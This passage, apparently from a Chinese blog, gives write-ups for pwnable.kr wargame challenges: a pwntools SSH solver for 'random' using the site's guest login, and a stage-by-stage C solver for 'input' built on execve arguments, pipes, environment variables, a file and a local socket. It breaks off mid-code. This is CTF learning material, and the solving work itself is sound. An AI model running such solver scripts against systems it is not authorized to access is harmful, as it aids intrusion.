<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                            </span><br><span class="line">s=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'random'</span>,port=<span class="number">2222</span>,password=<span class="string">'guest'</span>)</span><br><span class="line">p=s.process(<span class="string">'./random'</span>)</span><br><span class="line">p.sendline(<span class="string">'3039230856'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><hr>
<p>思路：<br>1.有源码分析源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// argv</span></span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// stdio</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// env</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// file</span></span><br><span class="line">	FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// network</span></span><br><span class="line">	<span class="keyword">int</span> sd, cd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">	<span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// here's your flag</span></span><br><span class="line">	system(<span class="string">"/bin/cat flag"</span>);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题主要考察了5种输入方式，很考验linux编程功底，没办法只能一个一个查知识点了</p>
<h3 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// argv</span></span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br></pre></td></tr></table></figure>

<p>这部份很明显，我们需要执行这个input的时候有100个参数，并且第65个参数（即A的ascii码值）是”\x00”，第66个参数是”\x20\x0a\x0d”。然而我们会发现由于”\x00”的截断和”\x20\x0a\x0d”中又有换行符回车空字符这种东西，所以在命令行里这个参数在输入时会被截断，所以我们只能用写一个C语言文件编译执行<a href="https://wood1314.github.io/2019/07/09/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/#%E5%8A%A0%E8%BD%BD%E5%B9%B6%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F">execve函数</a>来执行这个input文件。让我们在tmp文件夹内创建一个.c文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;mkdir /tmp/xxx</span><br><span class="line">&gt;cd /tmp/xxx</span><br><span class="line">&gt;touch input_argvs.c</span><br></pre></td></tr></table></figure>

<p>下面是这部分exp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="comment">/*stage1 looking for 100 arguments we need one extre space at end*/</span></span><br><span class="line">        <span class="keyword">char</span> *args[<span class="number">101</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">101</span>; i++)&#123;</span><br><span class="line">                args[i] = <span class="string">"A"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        args[<span class="string">'A'</span>] = <span class="string">"\x00"</span>;</span><br><span class="line">        args[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>;</span><br><span class="line">        args[<span class="number">100</span>] = <span class="literal">NULL</span>;</span><br><span class="line">		execve(<span class="string">"/home/input2/input"</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行后我们可以发现stage1 clear</p>
<h3 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// stdio</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br></pre></td></tr></table></figure>

<p>第一个read中fd为0，这个在fd中已经见过，但对比的”\x00\x0a\x00\xff”字符串无法通过输入；而第二个read中的fd为2，表示stderr，对比”\x00\x0a\x02\xff”，stderr更是没有办法从命令行输入。因此只能IO重定向。所以我们需要<a href="https://wood1314.github.io/2019/07/09/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/#%E8%BF%9B%E7%A8%8B">fork一个子进程</a>，然后通过<a href="https://www.cnblogs.com/kunhu/p/3608109.html" target="_blank" rel="noopener">pipe</a>即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> childpid;</span><br><span class="line"><span class="keyword">int</span> pipe_stdin[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_stderr[<span class="number">2</span>];</span><br></pre></td></tr></table></figure>

<p>管道有两个“端”，一个用于读取，一个用于写入，这就是数组长度为2的原因。每个末端都有一个文件描述符，一个用于读取，一个用于写入。调用<code>pipe</code>每个管道会创建管道的读写端。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// call pipe() on both pipes</span></span><br><span class="line"><span class="keyword">if</span> (pipe(pipe_stdin) &lt; <span class="number">0</span> || pipe(pipe_stderr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  perror(<span class="string">"oh no\n"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>之后我们需要调用<code>fork()</code>来创建一个新的进程，并且将进程<code>PID</code>返回给<code>childpid</code>，然后检查是否成功。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fork the process</span></span><br><span class="line"><span class="keyword">if</span>((childpid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">"fork failed, oop"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们可以通过<code>childpid</code>的值判断当前活动的进程。<br>再次强调</p>
<blockquote>
<p><em>如果父进程想从子进程接受数据，那么它应该关闭fd1，子进程应该关闭fd0</em><br><em>如果父进程想向子进程传送数据，那么它应该关闭fd0，子进程应该关闭fd1</em><br><em>由于描述符在父进程和子进程之间共享，所以我们应该始终确保关闭那些无关的管道端</em></p>
</blockquote>
<p>我们可以让子进程将期望值（“\ x00 \ x0a \ x00 \ xff”和“\ x00 \ x0a \ x02 \ xff”）写入两个管道，这意味着首先我们需要关闭读取端。</p>
<p><code>else</code>的情况表示父进程需要关闭管道的写入端。<a href="http://man7.org/linux/man-pages/man2/dup.2.html" target="_blank" rel="noopener">Dup2</a>将文件描述符重新映射。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// child process can close input side of pipe and write expected values</span></span><br><span class="line"><span class="keyword">if</span>(childpid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Child process closes up input side of pipe */</span></span><br><span class="line">    close(pipe_stdin[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_stderr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    write(pipe_stdin[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">    write(pipe_stderr[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* parent process can close up output side of pipe, connect it to stdin and stderr, </span></span><br><span class="line"><span class="comment">    and then close the input side and call/home/input2/input */</span></span><br><span class="line">    close(pipe_stdin[<span class="number">1</span>]);</span><br><span class="line">    close(pipe_stderr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    dup2(pipe_stdin[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">    dup2(pipe_stderr[<span class="number">0</span>],<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_stdin[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_stderr[<span class="number">0</span>]);</span><br><span class="line">    execve(<span class="string">"/home/input2/input"</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在stage2也通过了</p>
<h3 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h3><p>在第三关，我们只需要设置env(环境变量)就行了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br></pre></td></tr></table></figure>

<p>我们的解决方法是在执行execve函数时加上env参数就行了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *env[<span class="number">2</span>] = &#123;<span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">execve(<span class="string">"/home/input2/input"</span>, args, env);</span><br></pre></td></tr></table></figure>

<h3 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h3><p>第四关是读取指定文件里的内容，并且让里面的内容符合要求，我们该怎么做呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br></pre></td></tr></table></figure>

<p>我们只需要创建题目要求的文件，并向里面写指定的文件内容就行了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"w"</span>);</span><br><span class="line">fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure>

<p>现在第四关也同过了</p>
<h3 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h3><p>下面是第五关的代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br></pre></td></tr></table></figure>

<p>Ohhh,我的天，涉及到了我的知识盲区，所以先放一放，我先<a href="https://wood1314.github.io/2019/07/10/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/#socket%E5%87%BD%E6%95%B0">补一下知识</a>。<br>了解了一些知识以后我们可以看出，这段代码是服务器端的，因此我们只需要创建一个与其结构相似的客户端套接字并传输数据就ok了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Stage 1 addition:  </span></span><br><span class="line">args[<span class="string">'C'</span>] = <span class="string">"5001"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stage 5</span></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">saddr.sin_port = htons(atoi(args[<span class="string">'C'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(connect(sd, (struct sockaddr *)&amp;saddr, <span class="keyword">sizeof</span>(saddr))&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"\n Error : Connect Failed \n"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write(sd, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>);</span><br><span class="line"> close(sd);</span><br></pre></td></tr></table></figure>

<h3 id="全部的writeup"><a href="#全部的writeup" class="headerlink" title="全部的writeup"></a>全部的writeup</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="comment">/*stage1 looking for 100 arguments we need one extre space at end*/</span></span><br><span class="line">        <span class="keyword">char</span> *args[<span class="number">101</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">101</span>; i++)&#123;</span><br><span class="line">                args[i] = <span class="string">"A"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        args[<span class="string">'A'</span>] = <span class="string">"\x00"</span>;</span><br><span class="line">        args[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>;</span><br><span class="line">        args[<span class="string">'C'</span>] = <span class="string">"5001"</span>;</span><br><span class="line">        args[<span class="number">100</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//stage3</span></span><br><span class="line">        <span class="keyword">char</span> *env[<span class="number">2</span>] = &#123;<span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//stage4</span></span><br><span class="line">        FILE *fp;</span><br><span class="line">        fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//stage2</span></span><br><span class="line">        <span class="keyword">pid_t</span> childpid;</span><br><span class="line">        <span class="keyword">int</span> pipe_stdin[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> pipe_stderr[<span class="number">2</span>];</span><br><span class="line">        <span class="comment">// call pipe() on both pipes</span></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_stdin) &lt; <span class="number">0</span> || pipe(pipe_stderr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                 perror(<span class="string">"oh no\n"</span>);</span><br><span class="line">                 <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// fork the process</span></span><br><span class="line">        <span class="keyword">if</span>((childpid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">"fork failed, oop"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// child process can close input side of pipe and write expected values</span></span><br><span class="line">        <span class="keyword">if</span>(childpid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Child process closes up input side of pipe */</span></span><br><span class="line">            close(pipe_stdin[<span class="number">0</span>]);</span><br><span class="line">            close(pipe_stderr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            write(pipe_stdin[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">            write(pipe_stderr[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Stage 5:  network */</span></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">int</span> sd, cd;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">            sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            saddr.sin_family = AF_INET;</span><br><span class="line">            saddr.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">            saddr.sin_port = htons(atoi(args[<span class="string">'C'</span>]));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(connect(sd, (struct sockaddr *)&amp;saddr, <span class="keyword">sizeof</span>(saddr))&lt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n Error : Connect Failed \n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(sd, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>);</span><br><span class="line">            close(sd);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">         <span class="comment">/* parent process can close up output side of pipe, connect it to stdin and stderr, </span></span><br><span class="line"><span class="comment">            and then close the input side and call/home/input2/input */</span></span><br><span class="line">            close(pipe_stdin[<span class="number">1</span>]);</span><br><span class="line">            close(pipe_stderr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">            dup2(pipe_stdin[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">            dup2(pipe_stderr[<span class="number">0</span>],<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            close(pipe_stdin[<span class="number">0</span>]);</span><br><span class="line">            close(pipe_stderr[<span class="number">0</span>]);</span><br><span class="line">            execve(<span class="string">"/home/input2/input"</span>, args, 